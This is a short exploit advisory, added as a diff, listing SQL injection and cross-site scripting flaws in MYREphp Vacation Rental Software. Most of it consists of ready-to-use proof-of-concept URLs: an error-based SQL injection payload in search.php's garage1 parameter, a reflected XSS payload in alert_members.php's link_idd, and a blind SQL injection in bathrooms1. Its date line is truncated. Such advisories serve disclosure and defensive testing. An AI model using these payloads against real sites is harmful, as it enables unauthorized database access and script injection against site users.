@@ -1,0 +1,51 @@
+# Exploit Title: MYREphp Vacation Rental Software Multiple Vulnerabilities
+# Date: 13.10.201
+# Exploit Author: d3b4g
+# Vendor Homepage:http://myrephp.com
+# Software Link: http://myrephp.com/vacation/
+# Tested on: Windows 7
+# Blog: d3b4g.me
+
+
+ 
+  
+ 
+----------------------------------------------------------------------------------
+ () SQL Injection :
+
+  This vulnerability affects
+  ---------------------------
+ /vacation/1_mobile/search.php.
+
+   http://localhost/vacation/1_mobile/search.php?bathrooms1=&bedrooms1=&cata1=&cat_id1=&city1=&country1=&garage1=%28select%201%20and%20row%281%2c1%29%3e%28select%20count%28*%29%2cconcat%28concat%28CHAR%2852%29%2cCHAR%2867%29%2cCHAR%28117%29%2cCHAR%2881%29%2cCHAR%2878%29%2cCHAR%2879%29%2cCHAR%2866%29%2cCHAR%2871%29%2cCHAR%2866%29%2cCHAR%2880%29%2cCHAR%2849%29%29%2cfloor%28rand%28%29*2%29%29x%20from%20%28select%201%20union%20select%202%29a%20group%20by%20x%20limit%201%29%29&keywords1=&look=3&nolinks1=5&order=price&page=2&pool1=&price1=&price2=&sort=DESC&state1=&zip1=
+ 
+
+ () Cross Site Scripting:-
+
+
+   http://localhost/vacation/1_mobile/alert_members.php?action=login&link_idd=%27%20onmouseover%3dprompt%28900153%29%20bad%3d%27
+
+ 
+
+
+
+  () Blind SQL Injection
+    
+  Affected items:
+  ------------------
+  /vacation/1_mobile/search.php 
+  /vacation/widgate/request_more_information.php
+
+  POC:  http://localhost/vacation/1_mobile/search.php?bathrooms1=-1%20or%2077%20%3d%2075&bedrooms1=1&cat_id1=1&city1=San%20Francisco&look=1&nolinks1=20&order=link_id&price1=1&price2=1&sort=DESC
+
+ 
+ 
+ 
+  # note :- This script is pr0n to multiple sql injection vuln.
+
+
+-end-
+
+-end-
+ 
+
